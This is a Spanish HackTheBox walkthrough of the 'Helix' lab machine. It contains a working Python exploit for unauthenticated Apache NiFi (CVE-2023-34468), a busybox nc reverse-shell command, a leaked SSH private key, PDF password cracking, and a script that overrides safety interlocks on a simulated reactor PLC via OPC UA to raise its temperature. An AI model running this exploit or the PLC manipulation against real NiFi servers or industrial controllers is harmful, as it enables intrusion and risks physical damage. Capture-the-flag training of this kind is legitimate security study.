---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
---

# Helix HackTheBox (Intermediate)

# Contexto de la maquina

## Trayectoria Helix

<figure><img src="../../.gitbook/assets/trayectoria_5a37dcdff0.png" alt=""><figcaption></figcaption></figure>

## Descripción

**Helix** es una máquina Linux de dificultad **Intermediate** con un enfoque inusual: combina la explotación de un servicio web de automatización de datos (**Apache NiFi**) con la manipulación de un sistema de control industrial simulado mediante el protocolo **OPC UA** (OLE for Process Control Unified Architecture), ampliamente usado en entornos de infraestructura crítica como plantas químicas, refinerías y centrales energéticas.

El compromiso inicial se consigue explotando una instancia de **Apache NiFi 1.21.0** sin autenticación, creando un procesador `ExecuteProcess` que lanza comandos del sistema operativo directamente. Una vez dentro como el usuario `nifi`, encontramos una clave privada SSH del usuario `operator` en los archivos de soporte del servicio. Para la escalada final de privilegios, debemos interactuar con un **PLC simulado** accesible por OPC UA en `localhost:4840`, manipular sus registros de temperatura para simular una condición de mantenimiento y ejecutar una consola privilegiada que nos otorga shell como `root`.

**Objetivo**

- Explotar NiFi sin autenticación para obtener RCE como `nifi`.
- Encontrar la clave SSH privada del usuario `operator`.
- Descifrar documentación protegida con contraseña para entender el PLC.
- Manipular el sistema OPC UA para activar la ventana de mantenimiento.
- Obtener shell como `root` mediante el script de mantenimiento privilegiado.

**Tipo de máquina**

- Plataforma: Hack The Box
- Sistema operativo: Linux
- Categoría principal: Web / ICS (Industrial Control Systems)
- Componentes involucrados:
    - Apache NiFi 1.21.0 sin autenticación.
    - RCE mediante procesador `ExecuteProcess` de NiFi.
    - Clave SSH privada en archivos de soporte.
    - Documentación PDF protegida con contraseña.
    - OPC UA (protocolo industrial) en puerto 4840.
    - Script de mantenimiento privilegiado (`sudo`).

**Habilidades y técnicas evaluadas**

- Enumeración de servicios web y subdominios con FFUF.
- Identificación y explotación de Apache NiFi sin autenticación.
- Uso de la API REST de NiFi para crear procesadores maliciosos.
- Tratamiento y estabilización de TTY.
- Búsqueda de archivos sensibles en directorios de aplicación.
- Crackeo de PDF protegido con contraseña usando `pdf2john` y John the Ripper.
- SSH Local Port Forwarding para exponer servicios internos.
- Interacción con servidor OPC UA mediante Python (`opcua`).
- Enumeración y manipulación de nodos OPC UA.
- Activación de condición de mantenimiento industrial.
- Escalada de privilegios mediante `sudo` sin contraseña.
## Análisis de vulnerabilidades

<figure><img src="../../.gitbook/assets/carta_Apache_NiFi_1.21.0_sin_autenti_1783511066078.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Exposici_n_de_clave_SSH_privad_1783511066626.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Documentaci_n_operacional_con__1783511067181.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Escalada_de_privilegios_median_1783511067837.png" alt=""><figcaption></figcaption></figure>

# Escaneo de puertos

Comenzamos realizando un escaneo completo de todos los puertos TCP para identificar los servicios expuestos en la máquina objetivo. El flag `--open` nos filtra solo los puertos abiertos, `-sS` realiza un escaneo SYN (sigiloso), y `--min-rate 5000` acelera el proceso enviando al menos 5000 paquetes por segundo.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

Una vez identificados los puertos abiertos, lanzamos un segundo escaneo más detallado sobre ellos para obtener las versiones exactas de los servicios y ejecutar los scripts de detección por defecto de Nmap (`-sCV`).

```shell
nmap -sCV -p<PORTS> <IP>
```

Resultado:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-08 12:36 +0000
Nmap scan report for 10.129.245.123
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)

Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds
```

Solo dos puertos abiertos:

- **Puerto 22** → SSH (OpenSSH 8.9p1), de momento no explotable directamente.
- **Puerto 80** → HTTP (nginx 1.18.0), con redirección al dominio `helix.htb`.
## Añadir dominio al /etc/hosts

```bash
nano /etc/hosts

# Dentro del nano añadimos la siguiente línea:
<IP>          helix.htb
```
## Enumeración web

Accedemos al dominio:

```
URL = http://helix.htb/
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260708083327.png" alt=""><figcaption></figcaption></figure>

Página aparentemente normal. Antes de intentar nada en ella, realizamos fuzzing de subdominios para descubrir si hay servicios adicionales alojados bajo el mismo dominio.
# FFUF
## Fuzzing de subdominios (VHost)

```bash
ffuf -c -w subdomains-top1million-110000.txt -u "http://helix.htb" -H "Host: FUZZ.helix.htb" -t 100 -fw 4
```

Resultado:

```
flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 1457ms]
```

Encontramos el subdominio `flow`. Lo añadimos al archivo de hosts:

```bash
nano /etc/hosts

# Dentro del nano dejamos la línea así:
<IP>          helix.htb flow.helix.htb
```
## Acceso al subdominio flow

Accedemos al subdominio:

```
URL = http://flow.helix.htb/
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260708100331.png" alt=""><figcaption></figcaption></figure>

Encontramos directamente el panel de **Apache NiFi**, una plataforma de automatización del flujo de datos muy usada en entornos empresariales e industriales. Lo más llamativo es que el panel está completamente accesible sin autenticación, lo que es una configuración extremadamente insegura. Si identificamos la versión instalada (visible en la interfaz), podemos buscar vulnerabilidades asociadas.
# Escalate user nifi

<figure><img src="../../.gitbook/assets/vuln_Apache_NiFi_1.21.0_sin_autenti_fcebb18b.png" alt=""><figcaption></figcaption></figure>

## CVE-2023-34468 — RCE en Apache NiFi sin autenticación

El **CVE-2023-34468** afecta a versiones de Apache NiFi que exponen su API REST sin autenticación. El ataque consiste en crear directamente, mediante la API, un procesador de tipo `ExecuteProcess`, que es un componente legítimo de NiFi diseñado para ejecutar procesos del sistema operativo. Al no requerir autenticación, cualquier atacante puede abusar de él para ejecutar comandos arbitrarios como el usuario que corre el proceso NiFi.

El PoC de referencia está disponible en:

URL = [Exploit GitHub CVE-2023-34468](https://github.com/Jeanpt/CVE-2023-34468)

Sin embargo, después de probar el exploit público, este no da resultado debido a diferencias en la configuración del entorno. En su lugar, creamos nuestro propio script que interactúa directamente con la API REST de NiFi para crear y lanzar el procesador malicioso de forma controlada.
## Script de explotación personalizado

El script obtiene el ID del grupo de procesos raíz, crea un procesador `ExecuteProcess` en él y lo configura con el comando que queremos ejecutar. NiFi lo lanzará automáticamente al marcarlo como `RUNNING`:

> rce_nifi.py

```python
#!/usr/bin/env python3
import sys
import requests
import urllib3
urllib3.disable_warnings()

class NiFiRCE:
    def __init__(self, url):
        self.url = url.rstrip('/')
        if self.url.endswith('/nifi'):
            self.url = self.url[:-5]
        self.session = requests.Session()
        self.session.verify = False

    def get_root_group(self):
        r = self.session.get(f"{self.url}/nifi-api/process-groups/root")
        return r.json()["id"]

    def create_processor(self, group_id):
        url = f"{self.url}/nifi-api/process-groups/{group_id}/processors"
        data = {
            'component': {
                'type': 'org.apache.nifi.processors.standard.ExecuteProcess'
            },
            'revision': {'version': 0}
        }
        r = self.session.post(url, json=data)
        return r.json()["id"]

    def run_cmd(self, proc_id, cmd):
        parts = cmd.split(" ", 1)
        data = {
            'component': {
                'id': proc_id,
                'state': 'RUNNING',
                'config': {
                    'autoTerminatedRelationships': ['success'],
                    'schedulingPeriod': '3600 sec',
                    'properties': {
                        'Command': parts[0],
                        'Command Arguments': parts[1] if len(parts) > 1 else ''
                    }
                }
            },
            'revision': {'clientId': 'x', 'version': 1}
        }
        self.session.put(f"{self.url}/nifi-api/processors/{proc_id}", json=data)

    def exploit(self, cmd):
        gid = self.get_root_group()
        pid = self.create_processor(gid)
        self.run_cmd(pid, cmd)
        print(f"[+] Processor {pid} running: {cmd}")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_url> <command>")
        sys.exit(1)
    rce = NiFiRCE(sys.argv[1])
    rce.exploit(sys.argv[2])
```
## Obtención de la reverse shell

Nos ponemos a la escucha:

```bash
nc -lvnp <PORT>
```

Ejecutamos el exploit con un payload de `busybox nc` para establecer la reverse shell. Usamos `busybox` porque suele estar disponible en entornos minimalistas y su `nc` incluye la opción `-e` para ejecutar una shell:

```bash
python3 rce_nifi.py http://flow.helix.htb "busybox nc <IP_ATTACKER> <PORT_ATTACKER> -e /bin/bash"
```

Resultado:

```
[+] Processor 41256805-019f-1000-45f2-9d4b4d89acaf running: busybox nc 10.10.15.11 7777 -e /bin/bash
```

Si volvemos donde tenemos la escucha:

```
listening on [any] 7777 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.245.123] 43966
whoami
nifi
```

Tenemos shell como `nifi`. Sanitizamos la TTY.
## Sanitizacion shell (TTY)

La shell obtenida a través de una reverse shell suele ser muy limitada: no tiene autocompletado, no permite usar atajos de teclado como `Ctrl+C` sin matar la sesión, y en general es bastante incómoda. Por eso realizamos el siguiente proceso para convertirla en una TTY completamente interactiva:

```shell
script /dev/null -c bash
```

```shell
# Suspendemos el proceso con Ctrl+Z
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Consultamos las dimensiones de nuestra terminal local
stty size

# Ajustamos las dimensiones de la shell remota para que coincidan
stty rows <ROWS> columns <COLUMNS>
```
# Escalate user operator

<figure><img src="../../.gitbook/assets/vuln_Exposición_de_clave_SSH_privad_2372f1de.png" alt=""><figcaption></figcaption></figure>

## Búsqueda de archivos sensibles en la instalación de NiFi

Listamos el directorio de instalación de NiFi donde estamos. Entre los directorios visibles destaca `support-bundles`, que suele usarse para guardar paquetes de soporte y diagnóstico. Buscamos cualquier archivo relacionado con el usuario `operator`, ya que al listar los usuarios del sistema con shell activa solo encontramos `root` y `operator`:

```bash
find . -name "*operator*" 2>/dev/null
```

Resultado:

```
./support-bundles/operator_id_ed25519.bak
```

Hay un archivo de backup de clave SSH privada para el usuario `operator`. Lo leemos:

```bash
cat ./support-bundles/operator_id_ed25519.bak
```

Resultado:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
...
-----END OPENSSH PRIVATE KEY-----
```
## Acceso SSH como operator

Copiamos la clave a nuestra máquina atacante, le asignamos los permisos necesarios (SSH rechaza claves con permisos demasiado abiertos) y nos conectamos:

> id_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAATzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

```bash
chmod 600 id_rsa
ssh -i id_rsa operator@<IP>
```

Resultado:

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)
...
operator@helix:~$ whoami
operator
```

Somos `operator`. Leemos la flag del usuario:

> user.txt

```
979cdeae1051cb5abd8613d89657866a
```
# Escalate Privileges

<figure><img src="../../.gitbook/assets/vuln_Documentación_operacional_con__d8f864a7.png" alt=""><figcaption></figcaption></figure>

## Enumeración de permisos sudo

```bash
sudo -l
```

Resultado:

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Podemos ejecutar `helix-maint-console` como `root` sin contraseña. Leemos el script para entender qué hace:

```bash
cat /usr/local/sbin/helix-maint-console
```

Resultado:

```bash
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

...
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group \
  /bin/bash -p -i
```
## Análisis del script de mantenimiento

El script comprueba si existe el archivo `/opt/helix/state/maintenance_window` y si contiene un timestamp Unix futuro válido. Si la condición se cumple, lanza una shell interactiva de `root` mediante `systemd-run`. El archivo no lo creamos nosotros directamente: lo genera el propio sistema cuando detecta una condición de mantenimiento en el PLC. Por tanto, necesitamos provocar esa condición manipulando el PLC.
## Análisis de los archivos del home de operator

En el home de `operator` hay un PDF y una imagen PNG. Los transferimos a nuestra máquina para examinarlos:

```bash
# En la máquina víctima
python3 -m http.server
```

```bash
# En la máquina atacante
wget 'http://<IP>:8000/Operator Control & Safety Guide.pdf'
wget 'http://<IP>:8000/control systems diagram.png'
```
## Crackeo del PDF protegido con contraseña

El PDF requiere contraseña. Extraemos su hash y lo crackeamos con John:

```bash
pdf2john "Operator Control & Safety Guide.pdf" > hash_pdf
john hash_pdf --wordlist=<WORDLIST>
```

Resultado:

```
operator1        (Operator Control & Safety Guide.pdf)
```

La contraseña es `operator1`.
## Lectura de la documentación operacional

Abrimos el PDF con la contraseña crackeada:

<figure><img src="../../.gitbook/assets/Pasted image 20260708130553.png" alt=""><figcaption></figcaption></figure>

Y la imagen del diagrama del sistema:

<figure><img src="../../.gitbook/assets/Pasted image 20260708130821.png" alt=""><figcaption></figcaption></figure>

La imagen muestra el diagrama del sistema de control industrial, incluyendo el servidor OPC UA en el puerto `4840`. El PDF describe el procedimiento para activar la ventana de mantenimiento, que es exactamente lo que necesitamos para usar el script de `sudo`.

Según la documentación, el procedimiento es:

1. **Cambiar el modo del reactor a `MAINTENANCE`.**
2. **Activar el flag `TestOverride`** (permite modificar parámetros sin que los sistemas de seguridad intervencionen).
3. **Aumentar `CalibrationOffset` gradualmente** hasta que la temperatura supere ~295°C o la presión ~73 bar.
4. El sistema `helix-safety` detecta la condición y crea `/opt/helix/state/maintenance_window` con un timestamp de expiración.
5. Ejecutar `sudo /usr/local/sbin/helix-maint-console` dentro de la ventana de tiempo.

<figure><img src="../../.gitbook/assets/Pasted image 20260708131132.png" alt=""><figcaption></figcaption></figure>
## Exposición del puerto OPC UA con SSH Local Port Forwarding

<figure><img src="../../.gitbook/assets/vuln_Escalada_de_privilegios_median_18ab7499.png" alt=""><figcaption></figcaption></figure>

El servidor OPC UA escucha únicamente en `localhost:4840`:

```bash
ss -tuln | grep "4840"
```

Resultado:

```
tcp   LISTEN 0   100   127.0.0.1:4840   0.0.0.0:*
```

**OPC UA** (OLE for Process Control Unified Architecture) es el estándar de comunicación para sistemas de control industrial. Permite leer y escribir variables de un PLC (Programmable Logic Controller) de forma remota. Lo tunelizamos hacia nuestra máquina para poder interactuar con él usando las herramientas de Python:

```bash
ssh -i id_rsa operator@<IP> -L 4840:127.0.0.1:4840
```
## Instalación de la librería OPC UA para Python

```bash
python3 -m venv .venv; source .venv/bin/activate
pip install opcua
```
## Enumeración de nodos del PLC

Primero verificamos la conectividad y enumeramos los nodos disponibles en el servidor OPC UA. En OPC UA, los datos se organizan en una estructura jerárquica de nodos: objetos, variables, métodos, etc. Cada nodo tiene un `NodeId` único que usaremos para leerlo o escribirlo:

```bash
python3 << 'EOF'
from opcua import Client

client = Client("opc.tcp://localhost:4840")
client.connect()
print("[+] Conectado al PLC\n")

def explore_with_ids(node, depth=0):
    try:
        name = node.get_browse_name()
        node_class = node.get_node_class()
        node_id = node.nodeid
        prefix = "  " * depth
        print(f"{prefix}[{node_class}] {name}")
        print(f"{prefix}  NodeId: {node_id}")
        if "Variable" in str(node_class):
            try:
                value = node.get_value()
                print(f"{prefix}  Value: {value}")
            except:
                print(f"{prefix}  Value: <error>")
        print()
        for child in node.get_children():
            explore_with_ids(child, depth + 1)
    except Exception as e:
        print(f"  Error: {e}")

reactor = client.get_node("ns=2;i=1")
explore_with_ids(reactor)
client.disconnect()
EOF
```

Resultado:

```
[+] Conectado al PLC

[Plant]
  [Reactor]
    [Variable] TemperatureRaw    NodeId: ns=2;i=3
    [Variable] Temperature       NodeId: ns=2;i=4
    [Variable] Pressure          NodeId: ns=2;i=5
    [Variable] CalibrationOffset NodeId: ns=2;i=6
  [Safety]
    [Variable] RodsInserted      NodeId: ns=2;i=8
    [Variable] EmergencyCooling  NodeId: ns=2;i=9
    [Variable] TripActive        NodeId: ns=2;i=10
  [Control]
    [Variable] Mode              NodeId: ns=2;i=12
    [Variable] TestOverride      NodeId: ns=2;i=13
    [Variable] ResetTrip         NodeId: ns=2;i=14
```

Tenemos un mapa completo del PLC con todos los NodeIds. Los nodos clave que necesitamos manipular son:

| NodeId | Variable | Acción necesaria |
|---|---|---|
| `ns=2;i=4` | `Temperature` | Monitorizar hasta superar 295°C |
| `ns=2;i=6` | `CalibrationOffset` | Aumentar gradualmente para subir temperatura |
| `ns=2;i=10` | `TripActive` | Vigilar (si se activa, reducir offset) |
| `ns=2;i=12` | `Mode` | Cambiar a `"MAINTENANCE"` |
| `ns=2;i=13` | `TestOverride` | Activar a `True` |
## Manipulación del PLC para activar la ventana de mantenimiento

Con el mapa del PLC claro, ejecutamos el script que sigue el procedimiento del manual: cambia el modo, activa el override de prueba y sube el offset de calibración progresivamente hasta alcanzar la temperatura objetivo:

```bash
python3 << 'EOF'
from opcua import Client
import time

client = Client("opc.tcp://localhost:4840")
client.connect()
print("[+] Conectado al PLC\n")

temp_node        = client.get_node("ns=2;i=4")
pressure_node    = client.get_node("ns=2;i=5")
calib_node       = client.get_node("ns=2;i=6")
trip_node        = client.get_node("ns=2;i=10")
mode_node        = client.get_node("ns=2;i=12")
test_override    = client.get_node("ns=2;i=13")

# Estado inicial
print("[*] Estado actual:")
print(f"    Mode: {mode_node.get_value()}")
print(f"    TestOverride: {test_override.get_value()}")
print(f"    CalibrationOffset: {calib_node.get_value()}")
print(f"    Temperature: {temp_node.get_value():.2f}°C")
print(f"    Pressure: {pressure_node.get_value():.2f} bar")

# Paso 1: Modo MAINTENANCE
print("\n[*] Cambiando a MAINTENANCE...")
mode_node.set_value("MAINTENANCE")
time.sleep(1)

# Paso 2: Activar TestOverride
print("[*] Activando TestOverride...")
test_override.set_value(True)
time.sleep(1)

# Paso 3: Reset del offset
calib_node.set_value(0.0)
time.sleep(1)

# Paso 4: Subir temperatura gradualmente
print("\n[*] Aumentando temperatura hasta 295°C...")
while True:
    temp     = temp_node.get_value()
    pressure = pressure_node.get_value()
    calib    = calib_node.get_value()
    trip     = trip_node.get_value()

    print(f"    Temp: {temp:.2f}°C | Pressure: {pressure:.2f} bar | Offset: {calib:.2f} | Trip: {trip}")

    if trip:
        print("[!] TRIP ACTIVADO — reduciendo offset...")
        calib_node.set_value(max(0, calib - 15.0))
        time.sleep(1)
        continue

    if temp >= 295.0:
        print(f"\n[+] Temperatura objetivo alcanzada: {temp:.2f}°C")
        break

    calib_node.set_value(calib + 5.0)
    time.sleep(0.5)

print("\n[+] Condiciones de mantenimiento alcanzadas.")
print("[*] Ejecuta: sudo /usr/local/sbin/helix-maint-console")
client.disconnect()
EOF
```

Resultado:

```
[+] Conectado al PLC

[*] Estado actual:
    Mode: NORMAL
    TestOverride: False
    CalibrationOffset: 0.0
    Temperature: 283.80°C
    Pressure: 68.98 bar

[*] Cambiando a MAINTENANCE...
[*] Activando TestOverride...

[*] Aumentando temperatura hasta 295°C...
    Temp: 283.90°C | Pressure: 69.03 bar | Offset: 0.00 | Trip: False
    Temp: 283.93°C | Pressure: 69.03 bar | Offset: 5.00 | Trip: False
    Temp: 293.97°C | Pressure: 69.05 bar | Offset: 10.00 | Trip: False
    Temp: 299.00°C | Pressure: 69.06 bar | Offset: 15.00 | Trip: False

[+] Temperatura objetivo alcanzada: 299.00°C

[+] Condiciones de mantenimiento alcanzadas.
[*] Ejecuta: sudo /usr/local/sbin/helix-maint-console
```
## Ejecución de la consola de mantenimiento privilegiada

El sistema `helix-safety` ha detectado la condición de temperatura y ha creado el archivo de ventana de mantenimiento. Volvemos a la sesión de `operator` y ejecutamos el script privilegiado antes de que expire el tiempo:

```bash
sudo /usr/local/sbin/helix-maint-console
```

Resultado:

```
[+] Privileged maintenance access granted
[!] Window expires in 114 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# whoami
root
```

Ya somos `root`. Leemos la flag final:

> root.txt

```
d46ce6d31ef9c86aeaf2020da1b5362b
```

